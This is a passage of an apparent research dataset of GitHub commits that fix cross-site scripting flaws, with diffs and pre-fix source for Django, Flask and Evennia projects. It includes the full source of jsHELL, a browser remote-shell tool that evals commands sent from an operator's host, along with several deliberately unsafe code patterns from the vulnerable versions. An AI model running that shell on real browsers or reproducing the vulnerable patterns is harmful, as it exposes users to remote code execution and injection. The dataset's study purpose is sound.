return self.get_url_with_query_params({\n                    self.ordering_query_param: '-{}.{}'.format(self.column_id, \".\".join(new_query))\n                })\n            else:\n                return self.get_url_with_query_params({\n                    self.ordering_query_param: '{}.{}'.format(self.column_id, \".\".join(new_query))\n                })\n\n        else:\n            return self.get_reverse_sort_by()\n\n    def get_remove_sort_by(self):\n        new_query = []\n        for column in self.query_order.split('.'):\n            c = column.replace(\"-\", \"\")\n            if not int(c) == self.column_id:\n                new_query.append(column)\n        return self.get_url_with_query_params({\n            self.ordering_query_param: \".\".join(new_query)\n        })\n\n    def get_reverse_sort_by(self):\n        new_query = []\n        for column in self.query_order.split('.'):\n            c = column.replace(\"-\", \"\")\n            if int(c) == self.column_id:\n                if column.startswith(\"-\"):\n                    new_query.append(c)\n                else:\n                    new_query.append('-{}'.format(c))\n            else:\n                new_query.append(column)\n\n        return self.get_url_with_query_params({\n            self.ordering_query_param: \".\".join(new_query)\n        })\n\n\nclass SmartColumn(TitleFromModelFieldMixin, object):\n    def __init__(self, model, field, column_id, query_params, ordering_query_param, label=None, render_function=None):\n        self.model = model\n        self.field_name = field\n        self.label = label\n        self.render_function = render_function\n        self.order_field = None\n        self.order = None\n\n        # If there is no field_name that means it is not bound to any model field\n        if not self.field_name:\n            return\n\n        if self.field_name.startswith(\"_\") and self.field_name != \"__str__\":\n            raise SmartListException(\"Cannot use underscore(_) variables/functions in smart lists\")\n        try:\n            self.model_field = self.model._meta.get_field(self.field_name)\n            self.order_field = self.field_name\n        except FieldDoesNotExist:\n            self.model_field = None\n            try:\n                field = getattr(self.model, self.field_name)\n                if callable(field) and getattr(field, 'admin_order_field', False):\n                    self.order_field = getattr(field, 'admin_order_field')\n                if callable(field) and getattr(field, 'alters_data', False):\n                    raise SmartListException(\"Cannot use a function that alters data in smart list\")\n            except AttributeError:\n                self.order_field = self.field_name\n                pass  # This is most likely a .values() query set\n\n        if self.order_field:\n            self.order = SmartOrder(query_params=query_params, column_id=column_id, ordering_query_param=ordering_query_param)\n\n\nclass SmartFilterValue(QueryParamsMixin, object):\n    def __init__(self, field_name, label, value, query_params):\n        self.field_name = field_name\n        self.label = label\n        self.value = value\n        self.query_params = query_params\n\n    def get_title(self):\n        return self.label\n\n    def get_url(self):\n        return self.get_url_with_query_params({\n            self.field_name: self.value\n        })\n\n    def is_active(self):\n        if self.field_name in self.query_params:\n            selected_value = self.query_params[self.field_name]\n            if type(selected_value) == list:\n                selected_value = selected_value[0]\n            if selected_value == self.value:\n                return True\n        elif self.value is None:\n            return True\n        return False\n\n\nclass SmartFilter(TitleFromModelFieldMixin, object):\n    def __init__(self, model, field, query_params, object_list):\n        self.model = model\n\n        # self.model_field = None\n        if isinstance(field, SmartListFilter):\n            self.field_name = field.parameter_name\n            self.model_field = field\n        else:\n            self.field_name = field\n            self.model_field = self.model._meta.get_field(self.field_name)\n        self.query_params = query_params\n        self.object_list = object_list\n\n    def get_title(self):\n        if isinstance(self.model_field, SmartListFilter):\n            return self.model_field.title\n        return super(SmartFilter, self).get_title()\n\n    def get_values(self):\n        values = []\n        if isinstance(self.model_field, SmartListFilter):\n            values = [\n                SmartFilterValue(self.model_field.parameter_name, choice[1], choice[0], self.query_params) for choice in self.model_field.lookups()\n            ]\n        elif self.model_field.choices:\n            values = [\n                SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in self.model_field.choices\n            ]\n        elif type(self.model_field) == BooleanField:\n            values = [\n                SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in (\n                    (1, _('Yes')),\n                    (0, _('No'))\n                )\n            ]\n        elif issubclass(type(self.model_field), ForeignKey):\n            pks = self.object_list.order_by().distinct().values_list('%s__pk' % self.field_name, flat=True)\n            remote_field = self.model_field.rel if hasattr(self.model_field, 'rel') else self.model_field.remote_field\n            qs = remote_field.model.objects.filter(pk__in=pks)\n            values = [\n                SmartFilterValue(self.field_name, obj, str(obj.pk), self.query_params) for obj in qs\n            ]\n\n        return [SmartFilterValue(self.field_name, _(\"All\"), None, self.query_params)] + values\n\n\nclass SmartList(object):\n    def __init__(self, object_list, query_params=None, list_display=None, list_filter=None,\n                 list_search=None, search_query_param=None, ordering_query_param=None):\n        self.object_list = object_list\n        self.model = object_list.model\n        self.query_params = query_params or {}\n        self.list_display = list_display or []\n        self.list_filter = list_filter or []\n        self.list_search = list_search or []\n        self.search_query_value = self.query_params.get(search_query_param, '')\n        self.search_query_param = search_query_param\n        self.ordering_query_value = self.query_params.get(ordering_query_param, '')\n        self.ordering_query_param = ordering_query_param\n\n        self.columns = self.get_columns()\n\n        self.filters = [\n            SmartFilter(self.model, field, self.query_params, self.object_list) for i, field in enumerate(self.list_filter, start=1)\n        ] if self.list_filter else []\n\n    def get_columns(self):  # type: () -> List[SmartColumn]\n        \"\"\"\n        Transform list_display into list of SmartColumns\n        In list_display we expect:\n         1. name of the field (string)\n         or\n         2. two element iterable in which:\n            - first element is name of the field (string) or callable\n              which returns html\n            - label for the column (string)\n        \"\"\"\n\n        if not self.list_display:\n            return [SmartColumn(self.model, '__str__', 1, self.ordering_query_value, self.ordering_query_param)]\n\n        columns = []\n        for index, field in enumerate(self.list_display, start=1):\n            kwargs = {\n                'model': self.model,\n                'column_id': index,\n                'query_params': self.query_params,\n                'ordering_query_param': self.ordering_query_param,\n            }\n\n            try:\n                field, label = field\n            except (TypeError, ValueError):\n                kwargs['field'] = field\n            else:\n                if callable(field):\n                    kwargs['field'], kwargs['render_function'], kwargs['label'] = None, field, label\n                else:\n                    kwargs['field'], kwargs['label'] = field, label\n            columns.append(SmartColumn(**kwargs))\n        return columns\n\n    @property\n    def items(self):\n        return [\n            SmartListItem(self, obj) for obj in self.object_list\n        ]\n"}}, "msg": "fix XSS vulnerability in render_function"}}, "https://github.com/rakeshmane/jsHELL": {"88448ebe525815e97ee6724c428be88a638b5bb6": {"url": "https://api.github.com/repos/rakeshmane/jsHELL/commits/88448ebe525815e97ee6724c428be88a638b5bb6", "html_url": "https://github.com/rakeshmane/jsHELL/commit/88448ebe525815e97ee6724c428be88a638b5bb6", "message": "Fix XSS + Removed Unused Libraries", "sha": "88448ebe525815e97ee6724c428be88a638b5bb6", "keyword": "XSS fix", "diff": "diff --git a/jsHELL.py b/jsHELL.py\nindex a1c16a9..8f3b6b9 100644\n--- a/jsHELL.py\n+++ b/jsHELL.py\n@@ -1,5 +1,5 @@\n from flask_socketio import SocketIO,emit\n-from flask import Flask, render_template, session,request,flash,redirect,url_for\n+from flask import Flask\n import sys\n \n if len(sys.argv)<3:\n@@ -34,7 +34,7 @@\n     catch{}\n \n     socket.on('getMSG',function(data){\n-        document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black> [\"+data+\"]</font>\";\n+        document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black> [\"+data.replace(/</g,\"\")+\"]</font>\";\n         try{\n              output=eval(data)+\"\"\n         }\n", "files": {"/jsHELL.py": {"changes": [{"diff": "\n from flask_socketio import SocketIO,emit\n-from flask import Flask, render_template, session,request,flash,redirect,url_for\n+from flask import Flask\n import sys\n \n if len(sys.argv)<3:\n", "add": 1, "remove": 1, "filename": "/jsHELL.py", "badparts": ["from flask import Flask, render_template, session,request,flash,redirect,url_for"], "goodparts": ["from flask import Flask"]}, {"diff": "     catch{}\n \n     socket.on('getMSG',function(data){\n-        document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black> [\"+data+\"]</font>\";\n+        document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black> [\"+data.replace(/</g,\"\")+\"]</font>\";\n         try{\n              output=eval(data)+\"\"\n         }\n", "add": 1, "remove": 1, "filename": "/jsHELL.py", "badparts": ["        document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black> [\"+data+\"]</font>\";"], "goodparts": ["        document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black> [\"+data.replace(/</g,\"\")+\"]</font>\";"]}], "source": "\nfrom flask_socketio import SocketIO,emit from flask import Flask, render_template, session,request,flash,redirect,url_for import sys if len(sys.argv)<3: print \"Usage: python jShell.py IpAddress Port\\nExample: python jsHell.py 192.168.0.1 8080\" exit() PORT=sys.argv[2].strip() HOST=sys.argv[1].strip() print \"Listening on\",HOST+\":\"+PORT app=Flask(__name__) app.secret_key='I Am Batman.' access_key=\"Tony Stark Is The Best.\" session_id=\"This guy fucks!\" socketio=SocketIO(app) html=''' <div id=history></div> <script src=\"https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js\"></script> <script> ''' html=html+\"var socket=io.connect('http://{}:{}');\".format(HOST,PORT) html=html+''' try{setTimeout(` socket.emit('sendMSG','Connection Established.') `,1000) } catch{} socket.on('getMSG',function(data){ document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black>[\"+data+\"]</font>\"; try{ output=eval(data)+\"\" } catch(e){ output=e+\"\" } socket.emit('sendMSG',output) }) </script> ''' @app.route('/',methods=['GET']) def shell(): return html @socketio.on('sendMSG') def sendMSG(message): print(\"OUTPUT> \"+str(message)) command=raw_input(\"CMD> \") emit(\"getMSG\",command+\"\\n\") if command==\"exit\": exit() if __name__=='__main__': socketio.run(app,debug=True,host=HOST,port=int(PORT)) ", "sourceWithComments": "from flask_socketio import SocketIO,emit\nfrom flask import Flask, render_template, session,request,flash,redirect,url_for\nimport sys\n\nif len(sys.argv)<3:\n    print \"Usage : python jShell.py IpAddress Port\\nExample: python jsHell.py 192.168.0.1 8080\"\n    exit()\n\nPORT=sys.argv[2].strip()\nHOST=sys.argv[1].strip()\n\nprint \"Listening on\",HOST+\":\"+PORT\n\napp = Flask(__name__)\napp.secret_key='I Am Batman.'\naccess_key=\"Tony Stark Is The Best.\"\nsession_id=\"This guy fucks!\"\nsocketio = SocketIO(app)\n\nhtml='''\n<div id=history></div>\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js\"></script>\n\n<script>\n'''    \nhtml=html+\"var socket = io.connect('http://{}:{}');\".format(HOST,PORT)\n\nhtml=html+'''\n    try{setTimeout(`\n            socket.emit('sendMSG','Connection Established.')\n        `,1000)\n     }\n\n    catch{}\n\n    socket.on('getMSG',function(data){\n        document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black> [\"+data+\"]</font>\";\n        try{\n             output=eval(data)+\"\"\n        }\n        catch(e){\n            output=e+\"\"\n        }\n        socket.emit('sendMSG',output)\n    })\n</script>\n'''\n\n@app.route('/',methods = ['GET'])\ndef shell():\n    return html\n\n@socketio.on('sendMSG')\ndef sendMSG(message): #Get MSG from Client\n    print(\"OUTPUT> \"+str(message))\n    command=raw_input(\"CMD> \")\n    emit(\"getMSG\",command+\"\\n\")\n    if command==\"exit\":\n        exit()\n\nif __name__ == '__main__':\n   socketio.run(app,debug=True,host=HOST,port=int(PORT))\n\n"}}, "msg": "Fix XSS + Removed Unused Libraries"}}, "https://github.com/TAbdiukov/COMP6443-patch-last": {"59156d7040f96c076421414bce17ae96a970cd3a": {"url": "https://api.github.com/repos/TAbdiukov/COMP6443-patch-last/commits/59156d7040f96c076421414bce17ae96a970cd3a", "html_url": "https://github.com/TAbdiukov/COMP6443-patch-last/commit/59156d7040f96c076421414bce17ae96a970cd3a", "message": "fix XSS problem", "sha": "59156d7040f96c076421414bce17ae96a970cd3a", "keyword": "XSS fix", "diff": "diff --git a/squiggle_xss/app/squiggle_patch/main/views.py b/squiggle_xss/app/squiggle_patch/main/views.py\nindex 64b28c4..53b177b 100644\n--- a/squiggle_xss/app/squiggle_patch/main/views.py\n+++ b/squiggle_xss/app/squiggle_patch/main/views.py\n@@ -1,5 +1,6 @@\n #!/usr/bin/env python3\n import random\n+import html # for counter-xss escaping\n \n from flask import url_for, redirect, render_template, request\n \n@@ -8,19 +9,21 @@\n \n @app.route(\"/\")\n def root():\n-    return render_template(\"home.html\")\n-\n+\treturn render_template(\"home.html\")\n \n @app.route(\"/interact\", methods=[\"POST\"])\n def vuln():\n-    msg = request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')\n-    responses = [\n-        \"send help\",\n-        \"what is my purpose\",\n-        \"donate to us via bitcoin at: {{ bitcoin_address }}\",\n-        \"donate to us via paypal at: {{ paypal_address }}\",\n-        \"donate to us via venmo at: {{ venmo_address }}\",\n-        \"donate to us via beemit at: {{ beemit_address }}\",\n-    ]\n+\t#msg = request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')\n+\t# replace approach is no good\n+\tmsg = html.escape(request.form[\"message\"])\n+\t\n+\tresponses = [\n+\t\t\"send help\",\n+\t\t\"what is my purpose\",\n+\t\t\"donate to us via bitcoin at: {{ bitcoin_address }}\",\n+\t\t\"donate to us via paypal at: {{ paypal_address }}\",\n+\t\t\"donate to us via venmo at: {{ venmo_address }}\",\n+\t\t\"donate to us via beemit at: {{ beemit_address }}\",\n+\t]\n \n-    return render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses))\n+\treturn render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses))\n", "files": {"/squiggle_xss/app/squiggle_patch/main/views.py": {"changes": [{"diff": "\n @app.route(\"/\")\n def root():\n-    return render_template(\"home.html\")\n-\n+\treturn render_template(\"home.html\")\n \n @app.route(\"/interact\", methods=[\"POST\"])\n def vuln():\n-    msg = request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')\n-    responses = [\n-        \"send help\",\n-        \"what is my purpose\",\n-        \"donate to us via bitcoin at: {{ bitcoin_address }}\",\n-        \"donate to us via paypal at: {{ paypal_address }}\",\n-        \"donate to us via venmo at: {{ venmo_address }}\",\n-        \"donate to us via beemit at: {{ beemit_address }}\",\n-    ]\n+\t#msg = request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')\n+\t# replace approach is no good\n+\tmsg = html.escape(request.form[\"message\"])\n+\t\n+\tresponses = [\n+\t\t\"send help\",\n+\t\t\"what is my purpose\",\n+\t\t\"donate to us via bitcoin at: {{ bitcoin_address }}\",\n+\t\t\"donate to us via paypal at: {{ paypal_address }}\",\n+\t\t\"donate to us via venmo at: {{ venmo_address }}\",\n+\t\t\"donate to us via beemit at: {{ beemit_address }}\",\n+\t]\n \n-    return render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses))\n+\treturn render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses))\n", "add": 14, "remove": 12, "filename": "/squiggle_xss/app/squiggle_patch/main/views.py", "badparts": ["    return render_template(\"home.html\")", "    msg = request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')", "    responses = [", "        \"send help\",", "        \"what is my purpose\",", "        \"donate to us via bitcoin at: {{ bitcoin_address }}\",", "        \"donate to us via paypal at: {{ paypal_address }}\",", "        \"donate to us via venmo at: {{ venmo_address }}\",", "        \"donate to us via beemit at: {{ beemit_address }}\",", "    ]", "    return render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses))"], "goodparts": ["\treturn render_template(\"home.html\")", "\tmsg = html.escape(request.form[\"message\"])", "\t", "\tresponses = [", "\t\t\"send help\",", "\t\t\"what is my purpose\",", "\t\t\"donate to us via bitcoin at: {{ bitcoin_address }}\",", "\t\t\"donate to us via paypal at: {{ paypal_address }}\",", "\t\t\"donate to us via venmo at: {{ venmo_address }}\",", "\t\t\"donate to us via beemit at: {{ beemit_address }}\",", "\t]", "\treturn render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses))"]}], "source": "\n\nimport random from flask import url_for, redirect, render_template, request from. import bp as app @app.route(\"/\") def root(): return render_template(\"home.html\") @app.route(\"/interact\", methods=[\"POST\"]) def vuln(): msg=request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu') responses=[ \"send help\", \"what is my purpose\", \"donate to us via bitcoin at:{{ bitcoin_address}}\", \"donate to us via paypal at:{{ paypal_address}}\", \"donate to us via venmo at:{{ venmo_address}}\", \"donate to us via beemit at:{{ beemit_address}}\", ] return render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses)) ", "sourceWithComments": "#!/usr/bin/env python3\nimport random\n\nfrom flask import url_for, redirect, render_template, request\n\nfrom . import bp as app  # Note that app = blueprint, current_app = flask context\n\n\n@app.route(\"/\")\ndef root():\n    return render_template(\"home.html\")\n\n\n@app.route(\"/interact\", methods=[\"POST\"])\ndef vuln():\n    msg = request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')\n    responses = [\n        \"send help\",\n        \"what is my purpose\",\n        \"donate to us via bitcoin at: {{ bitcoin_address }}\",\n        \"donate to us via paypal at: {{ paypal_address }}\",\n        \"donate to us via venmo at: {{ venmo_address }}\",\n        \"donate to us via beemit at: {{ beemit_address }}\",\n    ]\n\n    return render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses))\n"}}, "msg": "fix XSS problem"}}, "https://github.com/evennia/evennia": {"300261529b82f95414c9d1d7150d6eda4695bb93": {"url": "https://api.github.com/repos/evennia/evennia/commits/300261529b82f95414c9d1d7150d6eda4695bb93", "html_url": "https://github.com/evennia/evennia/commit/300261529b82f95414c9d1d7150d6eda4695bb93", "message": "Escape AJAX session input to better protect against XSS attacks. Resolve #1846", "sha": "300261529b82f95414c9d1d7150d6eda4695bb93", "keyword": "XSS attack", "diff": "diff --git a/evennia/server/portal/webclient_ajax.py b/evennia/server/portal/webclient_ajax.py\nindex aa774e265..5c310aedf 100644\n--- a/evennia/server/portal/webclient_ajax.py\n+++ b/evennia/server/portal/webclient_ajax.py\n@@ -19,6 +19,7 @@\n import json\n import re\n import time\n+import cgi\n \n from twisted.web import server, resource\n from twisted.internet.task import LoopingCall\n@@ -35,12 +36,12 @@\n _SERVERNAME = settings.SERVERNAME\n _KEEPALIVE = 30  # how often to check keepalive\n \n+\n # defining a simple json encoder for returning\n # django data to the client. Might need to\n # extend this if one wants to send more\n # complex database objects too.\n \n-\n class LazyEncoder(json.JSONEncoder):\n     def default(self, obj):\n         if isinstance(obj, Promise):\n@@ -158,7 +159,7 @@ def mode_init(self, request):\n             request (Request): Incoming request.\n \n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n+        csessid = cgi.escape(request.args['csessid'][0])\n \n         remote_addr = request.getClientIP()\n         host_string = \"%s (%s:%s)\" % (_SERVERNAME, request.getRequestHostname(), request.getHost().port)\n@@ -190,7 +191,7 @@ def mode_keepalive(self, request):\n         This is called by render_POST when the\n         client is replying to the keepalive.\n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n+        csessid = cgi.escape(request.args['csessid'][0])\n         self.last_alive[csessid] = (time.time(), False)\n         return '\"\"'\n \n@@ -203,13 +204,12 @@ def mode_input(self, request):\n             request (Request): Incoming request.\n \n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n-\n+        csessid = cgi.escape(request.args['csessid'][0])\n         self.last_alive[csessid] = (time.time(), False)\n         sess = self.sessionhandler.sessions_from_csessid(csessid)\n         if sess:\n             sess = sess[0]\n-            cmdarray = json.loads(request.args.get('data')[0])\n+            cmdarray = json.loads(cgi.escape(request.args.get('data')[0]))\n             sess.sessionhandler.data_in(sess, **{cmdarray[0]: [cmdarray[1], cmdarray[2]]})\n         return '\"\"'\n \n@@ -224,7 +224,7 @@ def mode_receive(self, request):\n             request (Request): Incoming request.\n \n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n+        csessid = cgi.escape(request.args['csessid'][0])\n         self.last_alive[csessid] = (time.time(), False)\n \n         dataentries = self.databuffer.get(csessid, [])\n@@ -245,7 +245,7 @@ def mode_close(self, request):\n             request (Request): Incoming request.\n \n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n+        csessid = cgi.escape(request.args['csessid'][0])\n         try:\n             sess = self.sessionhandler.sessions_from_csessid(csessid)[0]\n             sess.sessionhandler.disconnect(sess)\n@@ -267,6 +267,7 @@ def render_POST(self, request):\n \n         \"\"\"\n         dmode = request.args.get('mode', [None])[0]\n+\n         if dmode == 'init':\n             # startup. Setup the server.\n             return self.mode_init(request)\n", "files": {"/evennia/server/portal/webclient_ajax.py": {"changes": [{"diff": "\n             request (Request): Incoming request.\n \n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n+        csessid = cgi.escape(request.args['csessid'][0])\n \n         remote_addr = request.getClientIP()\n         host_string = \"%s (%s:%s)\" % (_SERVERNAME, request.getRequestHostname(), request.getHost().port)\n", "add": 1, "remove": 1, "filename": "/evennia/server/portal/webclient_ajax.py", "badparts": ["        csessid = request.args.get('csessid')[0]"], "goodparts": ["        csessid = cgi.escape(request.args['csessid'][0])"]}, {"diff": "\n         This is called by render_POST when the\n         client is replying to the keepalive.\n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n+        csessid = cgi.escape(request.args['csessid'][0])\n         self.last_alive[csessid] = (time.time(), False)\n         return '\"\"'\n \n", "add": 1, "remove": 1, "filename": "/evennia/server/portal/webclient_ajax.py", "badparts": ["        csessid = request.args.get('csessid')[0]"], "goodparts": ["        csessid = cgi.escape(request.args['csessid'][0])"]}, {"diff": "\n             request (Request): Incoming request.\n \n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n-\n+        csessid = cgi.escape(request.args['csessid'][0])\n         self.last_alive[csessid] = (time.time(), False)\n         sess = self.sessionhandler.sessions_from_csessid(csessid)\n         if sess:\n             sess = sess[0]\n-            cmdarray = json.loads(request.args.get('data')[0])\n+            cmdarray = json.loads(cgi.escape(request.args.get('data')[0]))\n             sess.sessionhandler.data_in(sess, **{cmdarray[0]: [cmdarray[1], cmdarray[2]]})\n         return '\"\"'\n \n", "add": 2, "remove": 3, "filename": "/evennia/server/portal/webclient_ajax.py", "badparts": ["        csessid = request.args.get('csessid')[0]", "            cmdarray = json.loads(request.args.get('data')[0])"], "goodparts": ["        csessid = cgi.escape(request.args['csessid'][0])", "            cmdarray = json.loads(cgi.escape(request.args.get('data')[0]))"]}, {"diff": "\n             request (Request): Incoming request.\n \n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n+        csessid = cgi.escape(request.args['csessid'][0])\n         self.last_alive[csessid] = (time.time(), False)\n \n         dataentries = self.databuffer.get(csessid, [])\n", "add": 1, "remove": 1, "filename": "/evennia/server/portal/webclient_ajax.py", "badparts": ["        csessid = request.args.get('csessid')[0]"], "goodparts": ["        csessid = cgi.escape(request.args['csessid'][0])"]}, {"diff": "\n             request (Request): Incoming request.\n \n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n+        csessid = cgi.escape(request.args['csessid'][0])\n         try:\n             sess = self.sessionhandler.sessions_from_csessid(csessid)[0]\n             sess.sessionhandler.disconnect(sess)\n", "add": 1, "remove": 1, "filename": "/evennia/server/portal/webclient_ajax.py", "badparts": ["        csessid = request.args.get('csessid')[0]"], "goodparts": ["        csessid = cgi.escape(request.args['csessid'][0])"]}], "source": "\n\"\"\" AJAX/COMET fallback webclient The AJAX/COMET web client consists of two components running on twisted and django. They are both a part of the Evennia website url tree(so the testing website might be located on http://localhost:4001/, whereas the webclient can be found on http://localhost:4001/webclient.) /webclient -this url is handled through django's template system and serves the html page for the client itself along with its javascript chat program. /webclientdata -this url is called by the ajax chat using POST requests(long-polling when necessary) The WebClient resource in this module will handle these requests and act as a gateway to sessions connected over the webclient. \"\"\" import json import re import time from twisted.web import server, resource from twisted.internet.task import LoopingCall from django.utils.functional import Promise from django.utils.encoding import force_unicode from django.conf import settings from evennia.utils.ansi import parse_ansi from evennia.utils import utils from evennia.utils.text2html import parse_html from evennia.server import session _CLIENT_SESSIONS=utils.mod_import(settings.SESSION_ENGINE).SessionStore _RE_SCREENREADER_REGEX=re.compile(r\"%s\" % settings.SCREENREADER_REGEX_STRIP, re.DOTALL +re.MULTILINE) _SERVERNAME=settings.SERVERNAME _KEEPALIVE=30 class LazyEncoder(json.JSONEncoder): def default(self, obj): if isinstance(obj, Promise): return force_unicode(obj) return super(LazyEncoder, self).default(obj) def jsonify(obj): return utils.to_str(json.dumps(obj, ensure_ascii=False, cls=LazyEncoder)) class AjaxWebClient(resource.Resource): \"\"\" An ajax/comet long-polling transport \"\"\" isLeaf=True allowedMethods=('POST',) def __init__(self): self.requests={} self.databuffer={} self.last_alive={} self.keep_alive=None def _responseFailed(self, failure, csessid, request): \"callback if a request is lost/timed out\" try: del self.requests[csessid] except KeyError: pass def _keepalive(self): \"\"\" Callback for checking the connection is still alive. \"\"\" now=time.time() to_remove=[] keep_alives=((csessid, remove) for csessid,(t, remove) in self.last_alive.iteritems() if now -t > _KEEPALIVE) for csessid, remove in keep_alives: if remove: to_remove.append(csessid) else: self.last_alive[csessid]=(now, True) self.lineSend(csessid,[\"ajax_keepalive\",[],{}]) for csessid in to_remove: sessions=self.sessionhandler.sessions_from_csessid(csessid) for sess in sessions: sess.disconnect() self.last_alive.pop(csessid, None) if not self.last_alive: self.keep_alive.stop() self.keep_alive=None def at_login(self): \"\"\" Called when this session gets authenticated by the server. \"\"\" pass def lineSend(self, csessid, data): \"\"\" This adds the data to the buffer and/or sends it to the client as soon as possible. Args: csessid(int): Session id. data(list): A send structure[cmdname,[args],{kwargs}]. \"\"\" request=self.requests.get(csessid) if request: request.write(jsonify(data)) request.finish() del self.requests[csessid] else: dataentries=self.databuffer.get(csessid,[]) dataentries.append(jsonify(data)) self.databuffer[csessid]=dataentries def client_disconnect(self, csessid): \"\"\" Disconnect session with given csessid. Args: csessid(int): Session id. \"\"\" if csessid in self.requests: self.requests[csessid].finish() del self.requests[csessid] if csessid in self.databuffer: del self.databuffer[csessid] def mode_init(self, request): \"\"\" This is called by render_POST when the client requests an init mode operation(at startup) Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] remote_addr=request.getClientIP() host_string=\"%s(%s:%s)\" %(_SERVERNAME, request.getRequestHostname(), request.getHost().port) sess=AjaxWebClientSession() sess.client=self sess.init_session(\"ajax/comet\", remote_addr, self.sessionhandler) sess.csessid=csessid csession=_CLIENT_SESSIONS(session_key=sess.csessid) uid=csession and csession.get(\"webclient_authenticated_uid\", False) if uid: sess.uid=uid sess.logged_in=True sess.sessionhandler.connect(sess) self.last_alive[csessid]=(time.time(), False) if not self.keep_alive: self.keep_alive=LoopingCall(self._keepalive) self.keep_alive.start(_KEEPALIVE, now=False) return jsonify({'msg': host_string, 'csessid': csessid}) def mode_keepalive(self, request): \"\"\" This is called by render_POST when the client is replying to the keepalive. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) return '\"\"' def mode_input(self, request): \"\"\" This is called by render_POST when the client is sending data to the server. Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) sess=self.sessionhandler.sessions_from_csessid(csessid) if sess: sess=sess[0] cmdarray=json.loads(request.args.get('data')[0]) sess.sessionhandler.data_in(sess, **{cmdarray[0]:[cmdarray[1], cmdarray[2]]}) return '\"\"' def mode_receive(self, request): \"\"\" This is called by render_POST when the client is telling us that it is ready to receive data as soon as it is available. This is the basis of a long-polling(comet) mechanism: the server will wait to reply until data is available. Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) dataentries=self.databuffer.get(csessid,[]) if dataentries: return dataentries.pop(0) request.notifyFinish().addErrback(self._responseFailed, csessid, request) if csessid in self.requests: self.requests[csessid].finish() self.requests[csessid]=request return server.NOT_DONE_YET def mode_close(self, request): \"\"\" This is called by render_POST when the client is signalling that it is about to be closed. Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] try: sess=self.sessionhandler.sessions_from_csessid(csessid)[0] sess.sessionhandler.disconnect(sess) except IndexError: self.client_disconnect(csessid) return '\"\"' def render_POST(self, request): \"\"\" This function is what Twisted calls with POST requests coming in from the ajax client. The requests should be tagged with different modes depending on what needs to be done, such as initializing or sending/receving data through the request. It uses a long-polling mechanism to avoid sending data unless there is actual data available. Args: request(Request): Incoming request. \"\"\" dmode=request.args.get('mode',[None])[0] if dmode=='init': return self.mode_init(request) elif dmode=='input': return self.mode_input(request) elif dmode=='receive': return self.mode_receive(request) elif dmode=='close': return self.mode_close(request) elif dmode=='keepalive': return self.mode_keepalive(request) else: return '\"\"' class AjaxWebClientSession(session.Session): \"\"\" This represents a session running in an AjaxWebclient. \"\"\" def __init__(self, *args, **kwargs): self.protocol_key=\"webclient/ajax\" super(AjaxWebClientSession, self).__init__(*args, **kwargs) def get_client_session(self): \"\"\" Get the Client browser session(used for auto-login based on browser session) Returns: csession(ClientSession): This is a django-specific internal representation of the browser session. \"\"\" if self.csessid: return _CLIENT_SESSIONS(session_key=self.csessid) def disconnect(self, reason=\"Server disconnected.\"): \"\"\" Disconnect from server. Args: reason(str): Motivation for the disconnect. \"\"\" csession=self.get_client_session() if csession: csession[\"webclient_authenticated_uid\"]=None csession.save() self.logged_in=False self.client.lineSend(self.csessid,[\"connection_close\",[reason],{}]) self.client.client_disconnect(self.csessid) self.sessionhandler.disconnect(self) def at_login(self): csession=self.get_client_session() if csession: csession[\"webclient_authenticated_uid\"]=self.uid csession.save() def data_out(self, **kwargs): \"\"\" Data Evennia -> User Kwargs: kwargs(any): Options to the protocol \"\"\" self.sessionhandler.data_out(self, **kwargs) def send_text(self, *args, **kwargs): \"\"\" Send text data. This will pre-process the text for color-replacement, conversion to html etc. Args: text(str): Text to send. Kwargs: options(dict): Options-dict with the following keys understood: -raw(bool): No parsing at all(leave ansi-to-html markers unparsed). -nocolor(bool): Remove all color. -screenreader(bool): Use Screenreader mode. -send_prompt(bool): Send a prompt with parsed html \"\"\" if args: args=list(args) text=args[0] if text is None: return else: return flags=self.protocol_flags text=utils.to_str(text, force_string=True) options=kwargs.pop(\"options\",{}) 